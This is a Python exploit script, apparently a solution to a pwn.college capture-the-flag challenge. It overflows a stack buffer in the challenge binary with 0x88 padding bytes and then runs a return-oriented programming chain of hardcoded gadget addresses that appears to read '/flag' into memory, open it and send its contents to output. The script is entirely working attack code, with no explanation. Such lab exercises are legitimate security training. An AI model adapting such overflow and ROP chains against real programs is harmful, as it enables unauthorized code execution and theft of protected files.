#!/usr/bin/env python3

import os
import select
import struct
import subprocess
import sys
import time


def p64(value):
    return struct.pack("<Q", value)


def run(payload):
    process = subprocess.Popen(
        ["/challenge/indirect-invocation-easy"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )

    process.stdin.write(payload)
    process.stdin.flush()

    output = bytearray()
    deadline = time.time() + 10
    while b"Leaving!\n" not in output and time.time() < deadline:
        ready, _, _ = select.select([process.stdout], [], [], 0.1)
        if ready:
            chunk = os.read(process.stdout.fileno(), 1)
            if not chunk:
                break
            output.extend(chunk)

    assert b"Leaving!\n" in output, bytes(output).decode("latin1", errors="replace")

    process.stdin.write(b"/flag\0\0\0")
    process.stdin.close()
    output.extend(process.stdout.read())
    process.wait(timeout=10)
    return bytes(output)


payload = b"A" * 0x88
payload += p64(0x401D4C) + p64(0)
payload += p64(0x401D34) + p64(0x404800)
payload += p64(0x401D3C) + p64(8)
payload += p64(0x401160)
payload += p64(0x401D4C) + p64(0x404800)
payload += p64(0x401D34) + p64(0)
payload += p64(0x4011D0)
payload += p64(0x401D4C) + p64(1)
payload += p64(0x401D34) + p64(3)
payload += p64(0x401D3C) + p64(0)
payload += p64(0x401D44) + p64(128)
payload += p64(0x4011A0)

output = run(payload)
sys.stdout.buffer.write(output)
assert b"pwn.college{" in output
